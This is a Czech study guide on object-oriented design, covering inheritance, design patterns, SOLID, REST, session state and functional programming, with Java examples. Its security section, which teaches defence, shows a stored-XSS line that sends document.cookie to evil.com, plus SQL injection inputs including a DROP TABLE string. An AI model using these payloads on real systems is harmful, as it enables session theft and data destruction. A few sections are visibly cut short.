Objektové modelování

1. Dědičnost – princip, hierarchie tříd

Insight: Dědičnost říká „nová třída je starší třída, ale s něčím navíc." Umožňuje znovupoužití kódu a budování hierarchií.

Dědičnost je mechanismus, kdy podtřída (potomek) přebírá atributy a metody nadtřídy (rodiče) a může je rozšířit nebo přepsat. Java podporuje jednoduchou dědičnost tříd, ale vícenásobnou implementaci rozhraní.

Definice: B extends A — B dědí všechny public a protected členy A. B může přidat vlastní členy nebo přepsat (override) existující metody.
Příklad: 
class Animal {
    String name;
    void eat() { System.out.println(name + " eats"); }
}
class Dog extends Animal {
    void bark() { System.out.println("Woof!"); }
}
Dog d = new Dog();
d.eat();   // zděděno
d.bark();  // vlastní

Hierarchie: Object → Animal → Dog → GoldenRetriever

  • override – potomek přepíše metodu rodiče (@Override)
  • super – odkaz na nadtřídu; super.metoda() volá verzi rodiče
  • final class – třídu nelze dědit (např. String)
Upozornění: Hluboká hierarchie (5+ úrovní) = těžká udržovatelnost. Pravidlo: preferuj kompozici před dědičností (composition over inheritance).
Shrnutí:
  • Podtřída dědí atributy a metody rodiče, může je rozšířit nebo přepsat.
  • Java: jednoduchá dědičnost tříd, vícenásobná implementace rozhraní.
  • Klíčová slova: extends, super, @Override.
  • Hluboká hierarchie = problém → preferuj kompozici.

2. Asociace, agregace, kompozice

Insight: Všechny tři jsou vztahy „má" (has-a) mezi objekty – liší se silou vazby a dobou života části.
Definice:
  • Asociace – volné propojení; oba objekty existují nezávisle. „Učitel učí Studenty."
  • Agregace – celek–část; část může existovat i bez celku a patřit více celkům. „Playlist obsahuje Písničky."
  • Kompozice – silný celek–část; část bez celku nedává smysl, zanikne s ním. „Objednávka má Položky."
VztahUML symbolŽivotnost částiPříklad
Asociace→nezávisláStudent ↔ Učitel
Agregace◇— (prázdný kosočtverec)nezávislá, sdílenáPlaylist → Písničky
Kompozice◆— (plný kosočtverec)závisí na celkuObjednávka → Položky
Implementace v Javě: 
// Agregace – Song existuje bez Playlist
class Playlist { List<Song> songs; }

// Kompozice – OrderItem vzniká a zaniká s Order
class Order {
    List<OrderItem> items = new ArrayList<>();
    Order() { items.add(new OrderItem()); }
}
Upozornění: V Javě/C# je technický rozdíl minimální – jde o sémantický závazek v návrhu (kdo část tvoří, kdo ničí, lze ji sdílet?).
Shrnutí:
  • Asociace = volná vazba, oba nezávislí.
  • Agregace = celek–část, část může existovat i jinde.
  • Kompozice = silná vazba, část zanikne se celkem.
  • UML: prázdný vs. plný kosočtverec u celku.

3. Návrhové vzory – co to jsou, dělení

Insight: Návrhový vzor není hotový kód – je to recept na řešení opakujícího se problému. Popisuje postup, ty ho přizpůsobíš svým třídám.
Definice: Návrhový vzor (design pattern) je obecné opakovaně použitelné řešení typického problému v návrhu softwaru. Katalog 23 vzorů sestavil v roce 1994 Gang of Four (GoF): Gamma, Helm, Johnson, Vlissides.

1. Kreační — jak vytvářet objekty

Příklady:
  • Singleton – jediná instance třídy (konfigurace)
  • Factory Method – nadtřída definuje factory, podtřída rozhoduje o typu
  • Abstract Factory – rodina kompatibilních objektů (GUI pro Windows vs. Mac)
  • Builder – krok po kroku sestavuje složitý objekt
  • Prototype – kopírování existujícího objektu (clone)

2. Strukturální — jak skládat třídy

Příklady:
  • Adapter – konvertuje nekompatibilní interface (viz téma 8)
  • Decorator – přidává chování za běhu (viz téma 11)
  • Proxy – kontroluje přístup (viz téma 12)
  • Facade – zjednodušuje složitý subsystém jedním rozhraním
  • Composite – strom: listy i větve sdílejí interface (soubory a složky)

3. Behaviorální — jak objekty komunikují

Příklady:
  • Observer – publish/subscribe (viz téma 21)
  • Iterator – sekvenční přístup ke kolekci (viz téma 22)
  • Visitor – oddělení algoritmů od datové struktury (viz téma 23)
  • Strategy – zaměnitelné algoritmy
  • Command – požadavek jako objekt (undo/redo)
Upozornění: Vzory lze přepoužívat (overengineering). Aplikuj vzor jen když řešíš konkrétní opakující se problém – ne pro „profesionální vzhled".
Shrnutí:
  • GoF 1994, 23 vzorů.
  • Kreační: jak tvořit objekty.
  • Strukturální: jak skládat třídy.
  • Behaviorální: jak objekty spolupracují.

4. Vícevrstevnatá architektura (BO, DAO, Service layer)

Insight: Každá vrstva dělá jednu věc. Prezentace neví o databázi, databáze neví o UI.
Vrstvy (zdola nahoru):
  1. DAO (Data Access Object) – komunikace s DB, CRUD operace; izoluje zbytek od konkrétní DB technologie.
  2. Service Layer – orchestruje byznys logiku; volá DAO, aplikuje pravidla, koordinuje transakce.
  3. Prezentační vrstva (Controller) – přijímá HTTP požadavky; nesmí obsahovat byznys logiku.

Business Object (BO) – doménový objekt s daty i byznys logikou (např. Invoice.calculateTotal()). Patří do servisní/doménové vrstvy.

Spring Boot příklad: 
@Repository
class UserRepository { User findById(Long id) { /* SQL */ } }

@Service
class UserService {
    UserRepository repo;
    User getUser(Long id) {
        User u = repo.findById(id);
        if (u == null) throw new NotFoundException();
        return u;
    }
}

@RestController
class UserController {
    UserService service;
    @GetMapping("/users/{id}")
    User get(@PathVariable Long id) { return service.getUser(id); }
}
Anemic Domain Model – BO jsou jen getter/setter kontejnery, veškerá logika je v Service vrstvě → narušuje OOP. Doménové objekty mají nést i logiku.
Shrnutí:
  • Tři vrstvy: Prezentace → Service → DAO → DB.
  • DAO izoluje DB přístup; Service orchestruje logiku; Controller jen deleguje.
  • BO = doménový objekt s logikou, ne jen data.
  • Každá vrstva závisí pouze na vrstvě přímo pod ní.

5. Objekt, třída, zapouzdření

Insight: Třída je šablona (cookie cutter), objekt je výsledek (cookie). Zapouzdření: „kdo chce dort, dostane kousek – ne celou kuchyni."
Definice:
  • Třída – šablona/předpis popisující strukturu (atributy) a chování (metody).
  • Objekt – konkrétní instance třídy v paměti s vlastním stavem.
  • Zapouzdření (Encapsulation) – skrytí interní implementace za veřejné rozhraní. Atributy jsou private, přístup přes public metody.
ModifikátorViditelnost
privatePouze daná třída
protectedTřída + podtřídy + stejný package
(default)Stejný package
publicKdokoli
Příklad: 
class BankAccount {
    private double balance;
    public void deposit(double amount) {
        if (amount > 0) balance += amount;
    }
    public double getBalance() { return balance; }
}
BankAccount acc = new BankAccount();
acc.balance = -1000;  // CHYBA – private
acc.deposit(500);     // OK
Getter/setter anti-pattern: Pokud pro každý atribut existuje getter i setter, zapouzdření neplní účel. Odhaluj jen to, co je potřeba.
Shrnutí:
  • Třída = šablona; objekt = instance v paměti.
  • Zapouzdření = private atributy + public rozhraní.
  • Výhoda: změna implementace neovlivní klienty třídy.

6. Polymorfismus – staticky/dynamicky vázané metody, vtable

Insight: Polymorfismus = „mnoho podob". Stejné volání metody se chová různě podle skutečného typu objektu za běhu.
Definice: Polymorfismus umožňuje, aby proměnná nadtřídy (Animal a) odkazovala na objekt podtřídy (new Dog()) a volání metody se chovalo podle skutečného typu.

Statická vazba (Early Binding)

Kompilátor rozhodne v době překladu. Platí pro: přetížení metod (overloading), static / private / final metody.

Dynamická vazba (Late Binding)

Rozhodnutí se odkládá na dobu běhu. Platí pro přepsané (overridden) metody. V Javě jsou všechny instance metody implicitně virtuální.

Příklad: 
class Animal { void speak() { System.out.println("..."); } }
class Dog    extends Animal { @Override void speak() { System.out.println("Woof"); } }
class Cat    extends Animal { @Override void speak() { System.out.println("Meow"); } }

Animal a = new Dog();
a.speak();  // "Woof" — runtime rozhodne

vtable (Virtual Method Table)

Mechanismus dynamické vazby. Každá třída s virtuálními metodami má vtable – tabulku ukazatelů na metody. Každý objekt nese skrytý vptr na vtable své třídy.

Postup:
  1. Dog objekt nese vptr → Dog_vtable
  2. Dog_vtable[speak] → Dog::speak()
  3. Při volání a.speak(): přečti vptr, najdi slot, zavolej metodu

JVM dělá totéž interně (invokevirtual bytecode).

Overloading vs. Overriding: Overloading = různé parametry v jedné třídě → statická vazba. Overriding = přepsání metody v podtřídě → dynamická vazba.
Shrnutí:
  • Statická vazba: overloading – rozhoduje kompilátor.
  • Dynamická vazba: overriding – rozhoduje JVM za běhu.
  • vtable = tabulka virtuálních metod; vptr = ukazatel objektu na svou vtable.
  • Java: všechny instance metody jsou defaultně virtuální.

7. Abstraktní třída vs. interface

Insight: Interface = smlouva „co umíš". Abstraktní třída = „co umíš + jak to částečně děláš." Preferuj interface, pokud nepotřebuješ sdílenou implementaci.
VlastnostAbstraktní třídaInterface
Implementace metodAno (i konkrétní)Jen default metody (Java 8+)
AtributyLibovolnéJen public static final konstanty
DědičnostJen jedna nadtřídaLibovolně mnoho implementací
KonstruktorAnoNe
Kdy použítSdílená impl. pro příbuzné třídySmlouva pro nepříbuzné třídy
Příklad: 
interface Flyable { void fly(); }

abstract class Bird {
    String name;
    abstract void sing();
    void breathe() { /* sdílená implementace */ }
}

class Parrot extends Bird implements Flyable {
    void sing()       { System.out.println("Squawk"); }
    public void fly() { System.out.println("Flap flap"); }
}
Upozornění: Interface s jednou metodou (functional interface) lze v Javě 8+ použít jako lambdu. Abstraktní třídy to neumožňují.
Shrnutí:
  • Abstraktní třída: částečná implementace, jen jedna nadtřída, pro příbuzné třídy.
  • Interface: čistá smlouva, vícenásobná implementace, pro nepříbuzné třídy.
  • Pravidlo: pokud se obejdeš bez implementace, použij interface.

8. Adapter – popis, diagram, příklad

Insight: Adapter je jako cestovní adaptér – nepřepisuje zařízení, jen přizpůsobí rozhraní pro nové prostředí.
Definice: Adapter je strukturální vzor, který konvertuje interface jedné třídy na interface, který klient očekává. Umožňuje spolupráci tříd s nekompatibilními rozhraními.
Diagram: 
«interface»    «class»          «class»
Target     ←   Adapter      →   Adaptee
+ request()    + request()      + specificRequest()
                   └── volá Adaptee.specificRequest()
Příklad – legacy XML tiskárna v JSON světě: 
interface JsonPrinter { void printJson(String json); }

class XmlPrinter {
    void printXml(String xml) { System.out.println(xml); }
}

class XmlToJsonAdapter implements JsonPrinter {
    private XmlPrinter p;
    XmlToJsonAdapter(XmlPrinter p) { this.p = p; }
    public void printJson(String json) {
        p.printXml(convertJsonToXml(json));
    }
}

JsonPrinter printer = new XmlToJsonAdapter(new XmlPrinter());
printer.printJson("{\"name\":\"Adam\"}");
Shrnutí:
  • Adapter = strukturální vzor pro konverzi rozhraní.
  • Klient volá Target interface; Adapter deleguje na Adaptee.
  • Adapter implementuje jiné interface než Adaptee.
  • Použití: integrace legacy kódu, propojení nesouvisejících knihoven.

9. Rozdíl Adapter vs. Proxy vs. Decorator

Klíč: Mění se interface?
Ano → Adapter (konverze)  |  Ne + přidává chování → Decorator  |  Ne + kontroluje přístup → Proxy
VlastnostAdapterDecoratorProxy
Interface vůči klientoviJinýStejnýStejný
ZáměrKonverze rozhraníPřidání funkcionalityKontrola přístupu
Vznik vazbyRuntime / compile-timeRuntime (dynamicky)Typicky compile-time
PříkladLegacy integraceLogging, caching, šifrováníLazy loading, auth, remote
Paměťový trik:
  1. Mění interface? → Adapter
  2. Přidává chování za běhu? → Decorator
  3. Hlídá přístup k objektu? → Proxy
Shrnutí:
  • Adapter: různé interface → konverze.
  • Decorator: stejné interface → přidává vrstvy chování za běhu.
  • Proxy: stejné interface → kontroluje přístup.

10. Softwarová architektura – definice, typy, výhody a nevýhody

Insight: Architektura je plán města, ne plán domu – rozhoduje o struktuře celého systému, tato rozhodnutí jsou těžko změnitelná.
Definice: Softwarová architektura je vysokoúrovňová struktura systému – způsob, jakým jsou komponenty uspořádány, jak komunikují a jaké mají zodpovědnosti.
StylPopisVýhodyNevýhody
MonolitVše v jedné nasazovací jednotceJednoduchý vývoj, snadné laděníTěžké škálovat, velký deployment
LayeredPrezentace → Byznys → DataPřehlednost, testovatelnostKaždý požadavek prochází všemi vrstvami
MikroslužbyNezávislé služby s vlastní DBŠkálovatelnost, nezávislé nasazeníSložitost, síťová latence, distribuované transakce
Event-drivenKomunikace přes zprávy/událostiLoose coupling, asyncTěžké ladění, eventual consistency
Pipe-and-filterData proudí řetězem transformacíModulární, kompozitelnéLatence, složitá chybová propagace
Shrnutí:
  • Architektura = vysokoúrovňová struktura (těžko měnitelná).
  • Hlavní styly: Monolit, Layered, Mikroslužby, Event-driven, Pipe-and-filter.
  • Každý styl má trade-offs – žádný není universálně nejlepší.

11. Decorator – popis, diagram, příklad

Insight: Decorator = cibule. Každá vrstva obalí předchozí a přidá něco navíc, přičemž navenek vypadá pořád jako cibule (stejné rozhraní).
Definice: Decorator je strukturální vzor, který dynamicky přidává nové chování objektu bez změny jeho třídy. Implementuje stejný interface jako obalovaný objekt.
Diagram: 
«interface» Coffee
  + cost(): double
  + desc(): String

SimpleCoffee         MilkDecorator(Coffee)    SugarDecorator(Coffee)
cost() → 1.0         cost() → inner+0.3       cost() → inner+0.2
Příklad – káva s přísadami: 
interface Coffee { double cost(); String desc(); }

class SimpleCoffee implements Coffee {
    public double cost() { return 1.0; }
    public String desc() { return "Káva"; }
}

class MilkDecorator implements Coffee {
    private Coffee c;
    MilkDecorator(Coffee c) { this.c = c; }
    public double cost() { return c.cost() + 0.3; }
    public String desc() { return c.desc() + " + mléko"; }
}

Coffee c = new MilkDecorator(new MilkDecorator(new SimpleCoffee()));
c.desc();  // "Káva + mléko + mléko"
c.cost();  // 1.6

Reálné příklady: Java I/O streams (new BufferedReader(new FileReader(f))), HTTP middleware, Spring Security interceptory.

Upozornění: Mnoho dekorátorů = hluboký stack volání → ladění může být složité. Pořadí dekorátorů záleží!
Shrnutí:
  • Decorator obalí objekt a přidá chování za běhu – zachovává interface.
  • Dekorátory lze libovolně vrstvit.
  • Reálné použití: Java I/O, HTTP middleware, logování.

12. Proxy – popis, diagram, příklad

Insight: Proxy = recepční. Klient myslí, že mluví přímo s ředitelem (objektem), ale mluví s recepcí, která přístup filtruje nebo odkládá.
Definice: Proxy je strukturální vzor poskytující zástupný objekt, který kontroluje přístup k jinému objektu. Implementuje stejné rozhraní jako skutečný objekt.

Typy Proxy

  • Virtual Proxy – odkládá vytvoření drahého objektu (lazy init)
  • Protection Proxy – kontroluje oprávnění
  • Remote Proxy – přístup k objektu na jiném stroji (RMI stub)
  • Caching Proxy – ukládá výsledky pro opakované dotazy
Příklad – Virtual Proxy (lazy loading): 
interface Image { void display(); }

class RealImage implements Image {
    RealImage(String f) { loadFromDisk(f); }  // drahá operace
    public void display() { System.out.println("Displaying"); }
}

class ImageProxy implements Image {
    private RealImage real;
    private String file;
    ImageProxy(String f) { this.file = f; }  // disk se nenačte hned

    public void display() {
        if (real == null) real = new RealImage(file);  // lazy init
        real.display();
    }
}

Image img = new ImageProxy("photo.jpg");
img.display();  // teprve TEĎ se načte z disku
Shrnutí:
  • Proxy = zástupce se stejným interface jako skutečný objekt.
  • Typy: Virtual (lazy init), Protection (auth), Remote, Caching.
  • Klient neví, že mluví s proxy.

13. SOLID principy – přehled všech pěti

Insight: SOLID jsou pravidla pro kód, který se dá snadno rozšířit, otestovat a udržovat. Porušení SOLID se projeví jako bolest při každé změně požadavků.

S – Single Responsibility Principle

Třída má mít jen jeden důvod ke změně.

Porušení: UserManager ukládá uživatele, posílá emaily, generuje PDF → 3 důvody ke změně.
Oprava: UserRepository, EmailService, ReportGenerator.

O – Open/Closed Principle

Otevřeno pro rozšíření, uzavřeno pro modifikaci.

Přidáváš nové chování přes dědičnost/kompozici/strategie, ne editací existujícího kódu.

L – Liskov Substitution Principle

Objekty nadtřídy lze nahradit instancemi podtřídy bez narušení správnosti.

(Viz téma 14 pro detaily.)

I – Interface Segregation Principle

Klienty nenuť záviset na metodách, které nepoužívají.

Porušení: Interface Worker { work(); eat(); } – robot musí implementovat eat(), které pro něj nedává smysl.
Oprava: Rozděl na Workable a Feedable.

D – Dependency Inversion Principle

Závisej na abstrakcích, ne na konkrétních implementacích.

Příklad: OrderService závisí na PaymentProcessor interface, ne na StripePayment přímo → snadno zaměnitelné, testovatelné.

Shrnutí SOLID:
  • S: jeden důvod ke změně.
  • O: rozšiřuj přidáváním, ne modifikací.
  • L: podtřídy plně zaměnitelné za nadtřídy.
  • I: malá specializovaná rozhraní.
  • D: závisej na abstrakcích.

14. Liskov Substitution Principle (LSP) – detailně

Insight: Pokud slíbíš, že jsi „Pták", musíš umět létat. Podtřída musí splnit všechny sliby nadtřídy – nejen syntakticky, ale i chováním.
Definice (Barbara Liskov, 1987): Pokud je S podtypem T, pak objekty T mohou být v programu nahrazeny objekty S bez změny správného chování programu.

Podtřída nesmí:

  • Zpřísnit preconditions – vstupní podmínky nemohou být přísnější než u rodiče
  • Oslabit postconditions – výstup musí splňovat alespoň záruky rodiče
  • Porušit invarianty – vnitřní konzistence musí být zachována
  • Vyhodit nové výjimky, které rodič nevyhazuje
Příklad 1 – Rectangle vs. Square: 
class Rectangle {
    int width, height;
    void setWidth(int w)  { width = w; }
    void setHeight(int h) { height = h; }
    int area() { return width * height; }
}
class Square extends Rectangle {
    @Override void setWidth(int w)  { width = height = w; }   // !!!
    @Override void setHeight(int h) { width = height = h; }   // !!!
}
void test(Rectangle r) {
    r.setWidth(5); r.setHeight(3);
    assert r.area() == 15;  // selže pro Square (5*5=25)!
}

Oprava: Preferuj kompozici nebo společný interface Shape.

Příklad 2 – Bird vs. Penguin: 
class Bird { void fly() { /* letí */ } }
class Penguin extends Bird {
    @Override void fly() { throw new UnsupportedOperationException(); }
}
// Kód volající bird.fly() selže pro Penguin → LSP porušeno

Oprava: Odděl FlyingBird interface od obecného Bird.

Upozornění: IS-A vztah musí platit i behaviorálně, nejen strukturálně. „Čtverec geometricky je obdélník" neznamená, že Square extends Rectangle je bezpečné.
Shrnutí:
  • LSP: podtřídy musí být plně zaměnitelné – i chováním, nejen typem.
  • Nesmí zpřísnit preconditions, oslabit postconditions, porušit invarianty.
  • Klasická porušení: Rectangle/Square, Bird/Penguin.
  • Oprava: přehodnoť hierarchii nebo použij kompozici.

15. MVC – rozdíl od vrstevnaté architektury

Insight: MVC je vzor pro UI kód. Vrstevnatá architektura je způsob, jak rozdělit celou aplikaci. MVC žije uvnitř prezentační vrstvy třívrstvé architektury.

  • Controller – přijímá vstupy, manipuluje modelem, vybírá view

16. GRASP principy – High Cohesion, Low Coupling

Insight: Cohesion = jak pevně třída drží pohromadě. Coupling = kolik drátů ji spojuje s ostatními. Cíl: pevné třídy, tenké dráty.
GRASP (General Responsibility Assignment Software Patterns) – 9 principů pro přiřazení zodpovědností. Autor: Craig Larman.

High Cohesion (Vysoká soudržnost)

Metody a atributy třídy spolu logicky souvisejí; třída má jasně ohraničenou zodpovědnost.

Nízká soudržnost (špatně): UserManager s saveUser(), sendEmail(), generateReport(), computeTax()

Vysoká soudržnost (dobře): UserRepository (jen persistuje), EmailService (jen emaily), TaxCalculator (jen daně)

Low Coupling (Nízká provázanost)

Třída závisí na co nejméně jiných třídách; změna jedné neovlivní mnoho dalších.

Vysoké coupling (špatně): OrderService vytváří MySQLDatabase, StripePayment, SmtpEmailSender přímo

Nízké coupling (dobře): OrderService závisí na interface Database, PaymentProcessor, EmailSender → implementace je zaměnitelná

Vztah: High Cohesion a Low Coupling se vzájemně podporují – soudržná třída má přirozeně méně závislostí.
Shrnutí:
  • GRASP = 9 principů přiřazení zodpovědností (Craig Larman).
  • High Cohesion: třída dělá jednu věc, vše k sobě patří.
  • Low Coupling: minimální závislosti; závisíme na abstrakcích.
  • Výsledek: maintainable, testovatelný, rozšiřitelný kód.

17. REST architektonický styl – principy, CRUD, HATEOAS

Insight: REST není protokol ani formát – je to soubor omezení pro návrh webových služeb. Klíč: každý zdroj má URL, komunikace je bezstavová.
Definice: REST (Representational State Transfer) – architektonický styl definovaný Royem Fieldingem (2000). Systém splňující REST principy = RESTful.

6 principů REST

  1. Client-Server – oddělení UI od datové logiky
  2. Stateless – každý požadavek nese veškerý kontext; server nedrží stav klienta
  3. Cacheable – odpovědi mohou být kešovány
  4. Uniform Interface – konzistentní přístup přes URL a HTTP metody
  5. Layered System – klient neví, zda komunikuje přímo nebo přes proxy
  6. Code on Demand (volitelné) – server posílá spustitelný kód (JS)

CRUD ↔ HTTP metody

HATEOAS

HATEOAS (Hypermedia as the Engine of Application State) – odpověď obsahuje linky na další akce; klient nemusí znát strukturu API předem.
Příklad HATEOAS odpovědi: 
{
  "id": 42, "name": "Adam",
  "_links": {
    "self":   { "href": "/users/42" },
    "orders": { "href": "/users/42/orders" },
    "delete": { "href": "/users/42", "method": "DELETE" }
  }
}
Upozornění: HATEOAS je součástí REST specifikace, ale v praxi ho většina API ignoruje ve prospěch dokumentace (OpenAPI/Swagger).
Shrnutí:
  • REST = 6 principů (stateless, uniform interface, cacheable…).
  • CRUD ↔ HTTP: GET/POST/PUT/PATCH/DELETE.
  • HATEOAS: odpovědi obsahují linky na další možné akce.

18. Stavovost server-client komunikace

Insight: HTTP je bezstavový protokol. Stav klienta musíme explicitně uložit – buď na klienta (JWT), nebo na server (session). Obojí má trade-offs.
  • Stateless – každý požadavek je samostatný; server si nepamatuje předchozí interakce. Příklad: REST API s JWT.
  • Stateful – server drží kontext klienta mezi požadavky. Příklad: tradiční HttpSession.

   → Server vrátí JWT token (podepsaný)

  • HTTP je stateless; stav řešíme cookie/JWT/URL.
  • Session (server-side): jednodušší bezpečnost, složitější škálování.
  • JWT (client-side): snadné škálování, problém s invalidací.
  • Stateless REST = horizontálně škálovatelný.

19. Bezpečnost – XSS a SQL injection

Insight: Oba útoky stojí na stejném principu: útočník vloží kód tam, kde se očekávají data. Obrana: nikdy nevěř vstupu – vždy validuj a escapuj.

XSS – Cross-Site Scripting

Definice: Útočník vloží škodlivý JavaScript do stránky, který se spustí v prohlížeči ostatních uživatelů.
  • Reflected XSS – kód je v URL/požadavku; oběť musí kliknout na speciální odkaz
  • Stored/Persistent XSS – kód je uložen na serveru (komentář, profil) a zobrazí se všem automaticky. Nebezpečnější!
  • DOM-based XSS – útok probíhá pouze v prohlížeči, server se neúčastní
Příklad Stored XSS: 
// Útočník vloží do komentáře:
<script>fetch('https://evil.com/?c=' + document.cookie)</script>
// Server uloží bez sanitizace → zobrazí všem → ukradne cookies
Obrana proti XSS:
  • Escapovat výstup do HTML (< → &lt;)
  • Content Security Policy (CSP) – prohlížeč odmítne inline skripty
  • Cookies s flagem httpOnly (JS k nim nemá přístup)
  • Frameworky auto-escapující výstup (React, Vue, Thymeleaf)

SQL Injection

Definice: Útočník vloží SQL kód do vstupního pole, čímž změní původní SQL dotaz a získá neoprávněný přístup k DB.
Příklad: 
// Zranitelný kód:
String sql = "SELECT * FROM users WHERE name='" + userInput + "'";

// Vstup: ' OR '1'='1
// Výsledek: SELECT * FROM users WHERE name='' OR '1'='1'
// → Vrátí VŠECHNY uživatele!

// Horší varianta: admin'; DROP TABLE users; --
Obrana proti SQL injection:
  • Prepared statements / Parametrizované dotazy (nejúčinnější): WHERE name = ?
  • ORM (JPA/Hibernate) – automaticky parametrizuje
  • Validace a whitelisting vstupů
  • Princip nejnižších oprávnění – DB uživatel nesmí DROP TABLE
Shrnutí:
  • XSS: vložení JS do stránky; Stored XSS (persistent) je nejnebezpečnější.
  • SQL injection: vložení SQL do vstupu, mění dotaz.
  • Obrana XSS: escapování výstupu, CSP, httpOnly.
  • Obrana SQL: prepared statements, ORM, nejnižší oprávnění.

20. Funkcionální programování – map, filter, reduce (MapReduce)

Insight: FP: transformuj data bez mutace originálu. map/filter/reduce jsou základní operace nad kolekcemi; MapReduce rozšiřuje totéž na distribuované Big Data.

Klíčové koncepty FP

  • Pure functions – stejný vstup = stejný výstup, žádné side effects
  • Immutability – data se nemění, vytváří se nová
  • Higher-order functions – funkce jako parametry a návratové hodnoty
map / filter / reduce:
  • map(f) – aplikuje f na každý prvek → kolekce stejné délky
  • filter(predikát) – vrátí jen prvky splňující podmínku
  • reduce(f, init) – agreguje kolekci na jednu hodnotu
Java 8 Streams: 
List<Integer> nums = List.of(1, 2, 3, 4, 5, 6);

List<Integer> squares = nums.stream()
    .map(n -> n * n)             // [1, 4, 9, 16, 25, 36]
    .collect(Collectors.toList());

List<Integer> evens = nums.stream()
    .filter(n -> n % 2 == 0)     // [2, 4, 6]
    .collect(Collectors.toList());

int sum = nums.stream()
    .reduce(0, Integer::sum);    // 21

MapReduce (Big Data)

MapReduce – distribuovaný model zpracování dat (Google/Hadoop). Fáze: Map → Shuffle → Reduce.
Příklad – počítání slov: 
// Map: každé slovo → (slovo, 1)
"hello world hello" → [(hello,1), (world,1), (hello,1)]

// Shuffle: seskup podle klíče
hello → [1,1],  world → [1]

// Reduce: součet
hello → 2,  world → 1

Map fáze běží paralelně na všech nodech; Reduce agreguje výsledky.

Shrnutí:
  • FP: pure functions, immutability, higher-order functions.
  • map = transformace; filter = výběr; reduce = agregace.
  • Java 8+: Stream API; Python: vestavěné funkce.
  • MapReduce (Hadoop): distribuovaný vzor Map→Shuffle→Reduce.

21. Observer návrhový vzor

Insight: Observer = novinový odběr. Vydavatel neví, kdo odebírá. Odběratelé reagují na každou změnu automaticky – bez poolingu.
Definice: Observer (publish-subscribe) – behaviorální vzor, závislost jeden-k-mnoha. Změna stavu subjektu → automatická notifikace všech registrovaných pozorovatelů.
Příklad: 
interface Observer { void update(String event); }

class EventSource {
    private List<Observer> observers = new ArrayList<>();
    void subscribe(Observer o)   { observers.add(o); }
    void unsubscribe(Observer o) { observers.remove(o); }
    void changeState(String s) {
        // ... interní změna ...
        observers.forEach(o -> o.update(s));
    }
}

class Logger implements Observer {
    public void update(String e) { System.out.println("Log: " + e); }
}

EventSource src = new EventSource();
src.subscribe(new Logger());
src.changeState("userLoggedIn");  // → "Log: userLoggedIn"

Reálné příklady: Java EventListener, JS addEventListener, Spring @EventListener, React state → překreslení komponent.

Memory leak: Observer bez unsubscribe() zůstane v paměti subjektu jako „zombie" reference. Vždy zajisti odhlášení při zániku observeru.
Shrnutí:
  • Publish-subscribe: jeden subjekt → mnoho pozorovatelů.
  • Loose coupling: subjekt nezná konkrétní typy observers.
  • Metody: subscribe, unsubscribe, notify.
  • Riziko: memory leak při zapomenutém unsubscribe.

22. Iterator návrhový vzor

Insight: Iterator = standardní způsob procházení kolekce. Klient iteruje přes hasNext/next a neví, zda je uvnitř pole, seznam, strom nebo síťový stream.
Definice: Iterator – behaviorální vzor poskytující sekvenční přístup k prvkům kolekce bez odhalení její interní reprezentace.
Java interface a použití: 
// java.util.Iterator<T>
interface Iterator<T> {
    boolean hasNext();
    T next();
    void remove();  // volitelně
}

Iterator<String> it = someCollection.iterator();
while (it.hasNext()) { System.out.println(it.next()); }
Vlastní Iterator – číselný rozsah: 
class NumberRange implements Iterable<Integer> {
    int from, to;
    NumberRange(int f, int t) { from=f; to=t; }
    public Iterator<Integer> iterator() {
        return new Iterator<Integer>() {
            int cur = from;
            public boolean hasNext() { return cur <= to; }
            public Integer next()    { return cur++; }
        };
    }
}
for (int n : new NumberRange(1, 5)) System.out.print(n + " ");
// 1 2 3 4 5
Shrnutí:
  • Sekvenční přístup ke kolekci bez znalosti interní struktury.
  • Interface: hasNext() + next().
  • Java: Iterable + Iterator → umožňuje for-each.
  • Různé kolekce sdílejí jednotný traversal interface.

23. Visitor návrhový vzor

Insight: Visitor odděluje „co s daty dělat" od „jak jsou data uložena". Přidáváš nové operace bez nutnosti měnit existující datové třídy.
Definice: Visitor – behaviorální vzor, který odděluje algoritmus od objektové struktury. Nové operace přidáváme bez změny tříd elementů.

Princip – Double Dispatch

Element volá accept(visitor) → visitor volá visit(this). Dvojité dynamické rozhodování: typ elementu + typ visitoru.

Příklad – plocha různých tvarů: 
interface Shape        { void accept(ShapeVisitor v); }
interface ShapeVisitor {
    void visit(Circle c);
    void visit(Rectangle r);
}

class Circle implements Shape {
    double radius;
    public void accept(ShapeVisitor v) { v.visit(this); }
}
class Rectangle implements Shape {
    double w, h;
    public void accept(ShapeVisitor v) { v.visit(this); }
}

// Nová operace BEZ změny Circle/Rectangle!
class AreaVisitor implements ShapeVisitor {
    double total = 0;
    public void visit(Circle c)    { total += Math.PI * c.radius * c.radius; }
    public void visit(Rectangle r) { total += r.w * r.h; }
}

List<Shape> shapes = List.of(new Circle(), new Rectangle());
AreaVisitor av = new AreaVisitor();
shapes.forEach(s -> s.accept(av));
System.out.println(av.total);
Nevýhoda: Přidáš-li nový typ elementu, musíš aktualizovat všechny visitore. Vhodné jen pokud jsou typy stabilní, ale operace se mění.
Shrnutí:
  • Odděluje operaci od datové struktury.
  • accept(visitor) → visit(this) = double dispatch.
  • Snadno přidáváš operace; složitě přidáváš nové typy elementů.
  • Reálné využití: AST traversal v kompilátorech, reportování.

24. Požadavky na systém – typy

Insight: Funkční = co systém dělá. Nefunkční = jak dobře to dělá. Systémové = v jakých mezích pracuje. Špatně definované požadavky jsou nejčastější příčinou neúspěchu projektů.

Funkční požadavky (Functional Requirements)

Definice: Popisují konkrétní chování a funkce systému.
Příklady:
  • „Systém umožní přihlásit se e-mailem a heslem."
  • „Uživatel může filtrovat produkty podle ceny a kategorie."
  • „Systém odešle potvrzovací e-mail do 5 minut od registrace."

Nefunkční požadavky (Non-Functional Requirements)

Definice: Popisují kvalitativní vlastnosti systému – jak dobře vykonává funkce.
KategoriePříklad měřitelného požadavku
Výkon„API odpoví do 200 ms pro P99 požadavků."
Dostupnost„Systém dostupný 99,9 % času (max. 8,7 h výpadku/rok)."
Škálovatelnost„Zvládne 10 000 souběžných uživatelů."
Bezpečnost„Hesla uložena hashovaná (bcrypt)."
Udržovatelnost„Kódová základna má 80 % pokrytí testy."
Použitelnost„Registrace dokončena do 2 minut."

Systémové / Omezující požadavky (Constraint Requirements)

Definice: Technologická a provozní omezení, ve kterých musí systém pracovat.
Příklady:
  • „Systém musí běžet na JVM (Java 17+)."
  • „Musí se integrovat se SAP ERP přes REST API."
  • „Data musí být uložena v EU (GDPR)."
  • „Deployment výhradně na AWS."
